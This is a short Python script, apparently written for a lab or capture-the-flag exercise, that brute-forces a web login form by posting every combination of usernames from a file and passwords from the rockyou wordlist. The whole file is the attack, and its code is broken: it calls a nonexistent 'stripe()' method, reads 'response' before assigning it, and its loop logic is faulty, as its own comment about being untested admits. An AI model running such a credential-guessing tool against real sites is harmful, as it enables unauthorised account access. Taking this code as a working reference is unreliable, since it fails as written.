#!/usr/bin/env python3

import requests
from itertools import product

# Variables 
url = ""
path = ""

full_url = url + path

# Replace username/password/submit by name of elem web form
def login(username, password):
    r = requests.post(url, data = {
        "username": username,
        "password": password,
        "submit": "Login",
    })
    return r 

# Print(login("test", "test").text) => juste to know if work

# If response allow us to know if username is valid based on text file named userid 
with open("userid", "r") as h:
    usernames = [line.stripe() for line in h.read().split("\n")]
# print(username)

# Same for password, here famous rockyou is used
with open("rockyou", "r") as h:
    passwords = [line.stripe() for line in h.read().split("\n")]

# Need to be tested, written freehand
# Loop who will test all usernames with all passwords and print the good one or stop
for username, password in product(usernames, passwords):
    try:
        while response == "Incorrect password!" or response == "Incorrect username!": 
            response = login(username, password).text
        print(f"{username}@{password}  : {response}")
    except ValueError:
        print("nothing match!")